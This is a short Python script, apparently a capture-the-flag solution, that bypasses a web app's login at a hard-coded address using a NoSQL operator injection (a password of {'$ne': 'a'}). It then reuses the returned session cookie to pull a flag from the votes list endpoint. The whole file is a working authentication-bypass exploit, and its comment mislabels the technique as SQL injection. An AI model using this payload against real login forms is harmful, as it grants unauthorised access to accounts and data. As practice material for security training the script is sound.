import requests

url = 'http://83.136.250.181:41453'

# Site is vulnerable to a sqli
data = {
  'username': "admin",
  'password': {"$ne": "a"}
}
resp = requests.post('{}/api/login'.format(url), json=data)

# Grab the authenticated cookie
cookies = resp.headers['Set-Cookie']
headers = {"Cookie": cookies}

# Grab the flag which should be one of the last entries in the list
resp = requests.get('{}/api/votes/list'.format(url), headers=headers)
print(resp.text)

